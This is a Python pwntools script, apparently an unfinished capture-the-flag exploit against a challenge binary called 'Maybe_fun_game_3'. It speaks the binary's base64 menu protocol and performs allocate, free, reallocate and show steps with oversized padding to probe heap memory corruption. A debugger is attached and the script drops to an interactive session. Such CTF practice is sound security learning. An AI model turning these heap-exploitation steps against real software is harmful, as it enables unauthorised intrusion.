from pwn import *
import base64
io=process('./Maybe_fun_game_3')
#io=remote('47.93.163.42', 36479)
context.log_level='debug'

def decode(a):
	mingwen=base64.b64decode(a)
	mingwen=mingwen[16:]
	#print(mingwen)
	s=[]
	for i in mingwen:
	   s.append(i)
	#print(s)
	for i in range(0xff,0x4f,-2):
	    key = s[s[i]]
	    for j in range(i):
		s[j] ^= key
	    #dele key
	    for k in range(s[i],i):
		s[k] = s[k+1]
	string=''
	s=s[:32]
	for i in s:
	    string+=chr(i)
	print(string)

def inputs(choice):
	a='wwnalnal\x20\x00\x00\x00\x00\x00\x00\x00'
	b=str(choice)
	b=b.ljust(0x60,'\x00')
	b=b.ljust(0x100,'\x06')
	mingwen=base64.b64encode(a+b)
	print(mingwen)
	return mingwen
	
def add(a1,s):
	choice=inputs(1)
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.sendline(choice)
	size=inputs(a1)
	io.sendlineafter('=\n',size)
	a='wwnalnal\x20\x00\x00\x00\x00\x00\x00\x00'
	content=base64.b64encode(a+s)	
	io.sendlineafter('=\n',content)
	io.recvuntil('=\n')

def dele(a1):
	choice=inputs(2)
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.sendline(choice)
	index=inputs(a1)
	io.sendlineafter('=\n',index)
	io.recvuntil('=\n')

def edit(a1,s):
	choice=inputs(3)
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.sendline(choice)
	index=inputs(a1)
	io.sendlineafter('=\n',index)	
	a='wwnalnal\x20\x00\x00\x00\x00\x00\x00\x00'
	content=base64.b64encode(a+s)	
	io.sendlineafter('=\n',content)
	io.recvuntil('=\n')

def show(a1):
	choice=inputs(4)
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.sendline(choice)
	index=inputs(a1)
	io.sendlineafter('=\n',index)


def exp():
	payload='a'*0x10
	payload=payload.ljust(0x60,'\x00')
	payload=payload.ljust(0x100,'\x11')
	add(56,payload)#0
	add(56,'aaaaaaaa')#1
	dele(0)	
	gdb.attach(io)
	add(56,'a'*0x100)
	
	show(0)
	
	io.interactive()
	choice=inputs(5)
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.sendline(choice)	
	size=inputs(8192)
	io.sendlineafter('=\n',size)
	io.recvuntil('=\n')
	
	
		
	#free(v3)
	choice=inputs(5)
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.recvuntil('=\n')
	io.sendline(choice)


exp()
	
